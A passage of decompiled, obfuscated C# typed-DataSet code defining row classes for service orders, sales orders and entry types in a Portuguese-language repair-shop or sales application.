			[DebuggerNonUserCode]
			public int NUM_ORDEM
			{
				get
				{
					return Conversions.ToInteger(base[tableTB_ORDEMSERVICO.NUM_ORDEMColumn]);
				}
				set
				{
					base[tableTB_ORDEMSERVICO.NUM_ORDEMColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string NOME_CLI
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_ORDEMSERVICO.NOME_CLIColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(19154), ex);
					}
				}
				set
				{
					base[tableTB_ORDEMSERVICO.NOME_CLIColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string CONTA_CLI
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_ORDEMSERVICO.CONTA_CLIColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(19290), ex);
					}
				}
				set
				{
					base[tableTB_ORDEMSERVICO.CONTA_CLIColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string TEL_CONTATO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_ORDEMSERVICO.TEL_CONTATOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(19428), ex);
					}
				}
				set
				{
					base[tableTB_ORDEMSERVICO.TEL_CONTATOColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string APARELHO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_ORDEMSERVICO.APARELHOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(19570), ex);
					}
				}
				set
				{
					base[tableTB_ORDEMSERVICO.APARELHOColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string MARCA
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_ORDEMSERVICO.MARCAColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(19706), ex);
					}
				}
				set
				{
					base[tableTB_ORDEMSERVICO.MARCAColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string MODELO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_ORDEMSERVICO.MODELOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(19836), ex);
					}
				}
				set
				{
					base[tableTB_ORDEMSERVICO.MODELOColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string NUM_SERIE
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_ORDEMSERVICO.NUM_SERIEColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(19968), ex);
					}
				}
				set
				{
					base[tableTB_ORDEMSERVICO.NUM_SERIEColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string ACESSORIO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_ORDEMSERVICO.ACESSORIOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(20106), ex);
					}
				}
				set
				{
					base[tableTB_ORDEMSERVICO.ACESSORIOColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string MARCAS_USO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_ORDEMSERVICO.MARCAS_USOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(20244), ex);
					}
				}
				set
				{
					base[tableTB_ORDEMSERVICO.MARCAS_USOColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string DEFEITO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_ORDEMSERVICO.DEFEITOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(20384), ex);
					}
				}
				set
				{
					base[tableTB_ORDEMSERVICO.DEFEITOColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string SERVICO_EXECUTADO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_ORDEMSERVICO.SERVICO_EXECUTADOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(20518), ex);
					}
				}
				set
				{
					base[tableTB_ORDEMSERVICO.SERVICO_EXECUTADOColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string DATA_ENTRADA
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_ORDEMSERVICO.DATA_ENTRADAColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(20672), ex);
					}
				}
				set
				{
					base[tableTB_ORDEMSERVICO.DATA_ENTRADAColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string DATA_SAIDA
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_ORDEMSERVICO.DATA_SAIDAColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(20816), ex);
					}
				}
				set
				{
					base[tableTB_ORDEMSERVICO.DATA_SAIDAColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string OBSERVACAO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_ORDEMSERVICO.OBSERVACAOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(20956), ex);
					}
				}
				set
				{
					base[tableTB_ORDEMSERVICO.OBSERVACAOColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string PARTE_DANIFICADA
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_ORDEMSERVICO.PARTE_DANIFICADAColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(21096), ex);
					}
				}
				set
				{
					base[tableTB_ORDEMSERVICO.PARTE_DANIFICADAColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string TEL_FIXO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_ORDEMSERVICO.TEL_FIXOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(21248), ex);
					}
				}
				set
				{
					base[tableTB_ORDEMSERVICO.TEL_FIXOColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public decimal PRECO_SERVICO
			{
				get
				{
					try
					{
						return Conversions.ToDecimal(base[tableTB_ORDEMSERVICO.PRECO_SERVICOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(21384), ex);
					}
				}
				set
				{
					base[tableTB_ORDEMSERVICO.PRECO_SERVICOColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			internal TB_ORDEMSERVICORow(DataRowBuilder rb)
			{
				\u0008.\u0002.\u0001();
				base..ctor(rb);
				tableTB_ORDEMSERVICO = (TB_ORDEMSERVICODataTable)base.Table;
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsNOME_CLINull()
			{
				return IsNull(tableTB_ORDEMSERVICO.NOME_CLIColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetNOME_CLINull()
			{
				base[tableTB_ORDEMSERVICO.NOME_CLIColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsCONTA_CLINull()
			{
				return IsNull(tableTB_ORDEMSERVICO.CONTA_CLIColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetCONTA_CLINull()
			{
				base[tableTB_ORDEMSERVICO.CONTA_CLIColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsTEL_CONTATONull()
			{
				return IsNull(tableTB_ORDEMSERVICO.TEL_CONTATOColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetTEL_CONTATONull()
			{
				base[tableTB_ORDEMSERVICO.TEL_CONTATOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsAPARELHONull()
			{
				return IsNull(tableTB_ORDEMSERVICO.APARELHOColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetAPARELHONull()
			{
				base[tableTB_ORDEMSERVICO.APARELHOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsMARCANull()
			{
				return IsNull(tableTB_ORDEMSERVICO.MARCAColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetMARCANull()
			{
				base[tableTB_ORDEMSERVICO.MARCAColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsMODELONull()
			{
				return IsNull(tableTB_ORDEMSERVICO.MODELOColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetMODELONull()
			{
				base[tableTB_ORDEMSERVICO.MODELOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsNUM_SERIENull()
			{
				return IsNull(tableTB_ORDEMSERVICO.NUM_SERIEColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetNUM_SERIENull()
			{
				base[tableTB_ORDEMSERVICO.NUM_SERIEColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsACESSORIONull()
			{
				return IsNull(tableTB_ORDEMSERVICO.ACESSORIOColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetACESSORIONull()
			{
				base[tableTB_ORDEMSERVICO.ACESSORIOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsMARCAS_USONull()
			{
				return IsNull(tableTB_ORDEMSERVICO.MARCAS_USOColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetMARCAS_USONull()
			{
				base[tableTB_ORDEMSERVICO.MARCAS_USOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsDEFEITONull()
			{
				return IsNull(tableTB_ORDEMSERVICO.DEFEITOColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetDEFEITONull()
			{
				base[tableTB_ORDEMSERVICO.DEFEITOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsSERVICO_EXECUTADONull()
			{
				return IsNull(tableTB_ORDEMSERVICO.SERVICO_EXECUTADOColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetSERVICO_EXECUTADONull()
			{
				base[tableTB_ORDEMSERVICO.SERVICO_EXECUTADOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsDATA_ENTRADANull()
			{
				return IsNull(tableTB_ORDEMSERVICO.DATA_ENTRADAColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetDATA_ENTRADANull()
			{
				base[tableTB_ORDEMSERVICO.DATA_ENTRADAColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsDATA_SAIDANull()
			{
				return IsNull(tableTB_ORDEMSERVICO.DATA_SAIDAColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetDATA_SAIDANull()
			{
				base[tableTB_ORDEMSERVICO.DATA_SAIDAColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsOBSERVACAONull()
			{
				return IsNull(tableTB_ORDEMSERVICO.OBSERVACAOColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetOBSERVACAONull()
			{
				base[tableTB_ORDEMSERVICO.OBSERVACAOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsPARTE_DANIFICADANull()
			{
				return IsNull(tableTB_ORDEMSERVICO.PARTE_DANIFICADAColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetPARTE_DANIFICADANull()
			{
				base[tableTB_ORDEMSERVICO.PARTE_DANIFICADAColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsTEL_FIXONull()
			{
				return IsNull(tableTB_ORDEMSERVICO.TEL_FIXOColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetTEL_FIXONull()
			{
				base[tableTB_ORDEMSERVICO.TEL_FIXOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsPRECO_SERVICONull()
			{
				return IsNull(tableTB_ORDEMSERVICO.PRECO_SERVICOColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetPRECO_SERVICONull()
			{
				base[tableTB_ORDEMSERVICO.PRECO_SERVICOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}
		}

		public class TB_PEDIDORow : DataRow
		{
			private TB_PEDIDODataTable tableTB_PEDIDO;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public int COD_PEDIDO
			{
				get
				{
					return Conversions.ToInteger(base[tableTB_PEDIDO.COD_PEDIDOColumn]);
				}
				set
				{
					base[tableTB_PEDIDO.COD_PEDIDOColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string CLIENTE
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_PEDIDO.CLIENTEColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(21530), ex);
					}
				}
				set
				{
					base[tableTB_PEDIDO.CLIENTEColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string PRODUTO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_PEDIDO.PRODUTOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(21652), ex);
					}
				}
				set
				{
					base[tableTB_PEDIDO.PRODUTOColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string DAT_PEDIDO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_PEDIDO.DAT_PEDIDOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(21774), ex);
					}
				}
				set
				{
					base[tableTB_PEDIDO.DAT_PEDIDOColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string FONE
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_PEDIDO.FONEColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(21902), ex);
					}
				}
				set
				{
					base[tableTB_PEDIDO.FONEColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string PRECO_CUSTO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_PEDIDO.PRECO_CUSTOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(22018), ex);
					}
				}
				set
				{
					base[tableTB_PEDIDO.PRECO_CUSTOColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string PRECO_FINAL
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_PEDIDO.PRECO_FINALColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(22148), ex);
					}
				}
				set
				{
					base[tableTB_PEDIDO.PRECO_FINALColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string QUANT_PEDIDA
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_PEDIDO.QUANT_PEDIDAColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(22278), ex);
					}
				}
				set
				{
					base[tableTB_PEDIDO.QUANT_PEDIDAColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string MARGEM_LUCRO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_PEDIDO.MARGEM_LUCROColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(22410), ex);
					}
				}
				set
				{
					base[tableTB_PEDIDO.MARGEM_LUCROColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string ENDERECO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_PEDIDO.ENDERECOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(22542), ex);
					}
				}
				set
				{
					base[tableTB_PEDIDO.ENDERECOColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string CIDADE
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_PEDIDO.CIDADEColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(22666), ex);
					}
				}
				set
				{
					base[tableTB_PEDIDO.CIDADEColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			internal TB_PEDIDORow(DataRowBuilder rb)
			{
				\u0008.\u0002.\u0001();
				base..ctor(rb);
				tableTB_PEDIDO = (TB_PEDIDODataTable)base.Table;
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsCLIENTENull()
			{
				return IsNull(tableTB_PEDIDO.CLIENTEColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetCLIENTENull()
			{
				base[tableTB_PEDIDO.CLIENTEColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsPRODUTONull()
			{
				return IsNull(tableTB_PEDIDO.PRODUTOColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetPRODUTONull()
			{
				base[tableTB_PEDIDO.PRODUTOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsDAT_PEDIDONull()
			{
				return IsNull(tableTB_PEDIDO.DAT_PEDIDOColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetDAT_PEDIDONull()
			{
				base[tableTB_PEDIDO.DAT_PEDIDOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsFONENull()
			{
				return IsNull(tableTB_PEDIDO.FONEColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetFONENull()
			{
				base[tableTB_PEDIDO.FONEColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsPRECO_CUSTONull()
			{
				return IsNull(tableTB_PEDIDO.PRECO_CUSTOColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetPRECO_CUSTONull()
			{
				base[tableTB_PEDIDO.PRECO_CUSTOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsPRECO_FINALNull()
			{
				return IsNull(tableTB_PEDIDO.PRECO_FINALColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetPRECO_FINALNull()
			{
				base[tableTB_PEDIDO.PRECO_FINALColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsQUANT_PEDIDANull()
			{
				return IsNull(tableTB_PEDIDO.QUANT_PEDIDAColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetQUANT_PEDIDANull()
			{
				base[tableTB_PEDIDO.QUANT_PEDIDAColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsMARGEM_LUCRONull()
			{
				return IsNull(tableTB_PEDIDO.MARGEM_LUCROColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetMARGEM_LUCRONull()
			{
				base[tableTB_PEDIDO.MARGEM_LUCROColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsENDERECONull()
			{
				return IsNull(tableTB_PEDIDO.ENDERECOColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetENDERECONull()
			{
				base[tableTB_PEDIDO.ENDERECOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsCIDADENull()
			{
				return IsNull(tableTB_PEDIDO.CIDADEColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetCIDADENull()
			{
				base[tableTB_PEDIDO.CIDADEColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}
		}

		public class TB_TIPOLANCAMENTORow : DataRow
		{
			private TB_TIPOLANCAMENTODataTable tableTB_TIPOLANCAMENTO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string Descrição
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_TIPOLANCAMENTO.DescriçãoColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(22786), ex);
					}
				}
				set
				{
					base[tableTB_TIPOLANCAMENTO.DescriçãoColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			internal TB_TIPOLANCAMENTORow(DataRowBuilder rb)
			{
				\u0008.\u0002.\u0001();
				base..ctor(rb);
				tableTB_TIPOLANCAMENTO = (TB_TIPOLANCAMENTODataTable)base.Table;
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsDescriçãoNull()
			{
				return IsNull(tableTB_TIPOLANCAMENTO.DescriçãoColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetDescriçãoNull()
			{
				base[tableTB_TIPOLANCAMENTO.DescriçãoColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}
		}

